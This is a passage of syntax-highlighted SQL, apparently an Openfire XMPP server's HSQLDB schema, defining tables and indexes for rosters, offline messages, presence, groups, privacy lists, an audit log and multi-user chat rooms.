<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFUSERFLAG_STIME_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFUSERFLAG<span class="token punctuation">(</span>STARTTIME<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFUSERFLAG_ETIME_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFUSERFLAG<span class="token punctuation">(</span>ENDTIME<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFOFFLINE<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MESSAGEID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CREATIONDATE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MESSAGESIZE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>STANZA <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFOFFLINE_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">,</span>MESSAGEID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPRESENCE<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>OFFLINEPRESENCE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span><span class="token punctuation">,</span>OFFLINEDATE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPRESENCE_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFROSTER<span class="token punctuation">(</span>ROSTERID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>JID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUB <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ASK <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>RECV <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NICK <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>STANZA <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFROSTER_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>ROSTERID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFROSTER_USERNAME_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFROSTER<span class="token punctuation">(</span>USERNAME<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFROSTER_JID_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFROSTER<span class="token punctuation">(</span>JID<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFROSTERGROUPS<span class="token punctuation">(</span>ROSTERID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>RANK <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>GROUPNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFROSTERGROUPS_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>ROSTERID<span class="token punctuation">,</span>RANK<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFROSTERGROUP_ROSTERID_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFROSTERGROUPS<span class="token punctuation">(</span>ROSTERID<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFVCARD<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>VCARD <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFVCARD_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFGROUP<span class="token punctuation">(</span>GROUPNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DESCRIPTION <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFGROUP_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>GROUPNAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFGROUPPROP<span class="token punctuation">(</span>GROUPNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PROPVALUE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFGROUPPROP_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>GROUPNAME<span class="token punctuation">,</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFGROUPUSER<span class="token punctuation">(</span>GROUPNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ADMINISTRATOR <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFGROUPUSER_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>GROUPNAME<span class="token punctuation">,</span>USERNAME<span class="token punctuation">,</span>ADMINISTRATOR<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFID<span class="token punctuation">(</span>IDTYPE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFID_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>IDTYPE<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPROPERTY<span class="token punctuation">(</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PROPVALUE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ENCRYPTED <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>IV <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPROPERTY_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFVERSION<span class="token punctuation">(</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>VERSION <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFVERSION_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFEXTCOMPONENTCONF<span class="token punctuation">(</span>SUBDOMAIN <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>WILDCARD <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SECRET <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>PERMISSION <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFEXTCOMPONENTCONF_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SUBDOMAIN<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFREMOTESERVERCONF<span class="token punctuation">(</span>XMPPDOMAIN <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>REMOTEPORT <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>PERMISSION <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFREMOTESERVERCONF_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>XMPPDOMAIN<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPRIVACYLIST<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ISDEFAULT <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>LIST <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPRIVACYLIST_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">,</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFPRIVACYLIST_DEFAULT_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPRIVACYLIST<span class="token punctuation">(</span>USERNAME<span class="token punctuation">,</span>ISDEFAULT<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFSASLAUTHORIZED<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PRINCIPAL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFSASLAUTHORIZED_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">,</span>PRINCIPAL<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFSECURITYAUDITLOG<span class="token punctuation">(</span>MSGID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ENTRYSTAMP <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUMMARY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NODE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DETAILS <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFSECURITYAUDITLOG_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>MSGID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFSECURITYAUDITLOG_TSTAMP_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFSECURITYAUDITLOG<span class="token punctuation">(</span>ENTRYSTAMP<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFSECURITYAUDITLOG_UNAME_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFSECURITYAUDITLOG<span class="token punctuation">(</span>USERNAME<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCSERVICE<span class="token punctuation">(</span>SERVICEID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUBDOMAIN <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DESCRIPTION <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ISHIDDEN <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFMUCSERVICE_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SUBDOMAIN<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFMUCSERVICE_SERVICEID_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCSERVICE<span class="token punctuation">(</span>SERVICEID<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCSERVICEPROP<span class="token punctuation">(</span>SERVICEID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PROPVALUE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFMUCSERVICEPROP_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCROOM<span class="token punctuation">(</span>SERVICEID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ROOMID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CREATIONDATE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MODIFICATIONDATE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NATURALNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DESCRIPTION <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>LOCKEDDATE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>EMPTYDATE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CANCHANGESUBJECT <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MAXUSERS <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PUBLICROOM <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MODERATED <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MEMBERSONLY <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CANINVITE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ROOMPASSWORD <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CANDISCOVERJID <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>LOGENABLED <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUBJECT <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ROLESTOBROADCAST <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>USERESERVEDNICK <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CANCHANGENICK <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CANREGISTER <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ALLOWPM <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>FMUCENABLED <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>FMUCOUTBOUNDNODE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>FMUCOUTBOUNDMODE <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>FMUCINBOUNDNODES <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFMUCROOM_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFMUCROOM_ROOMID_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCROOM<span class="token punctuation">(</span>ROOMID<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFMUCROOM_SERVICEID_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCROOM<span class="token punctuation">(</span>SERVICEID<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCROOMPROP<span class="token punctuation">(</span>ROOMID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PROPVALUE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFMUCROOMPROP_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>ROOMID<span class="token punctuation">,</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCAFFILIATION<span class="token punctuation">(</span>ROOMID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>JID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>AFFILIATION <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFMUCAFFILIATION_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>ROOMID<span class="token punctuation">,</span>JID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCMEMBER<span class="token punctuation">(</span>ROOMID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>JID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NICKNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>FIRSTNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>LASTNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>URL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>EMAIL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>FAQENTRY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFMUCMEMBER_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>ROOMID<span class="token punctuation">,</span>JID<span class="token punctuation">)</span><span class="token punctuation">)</span>
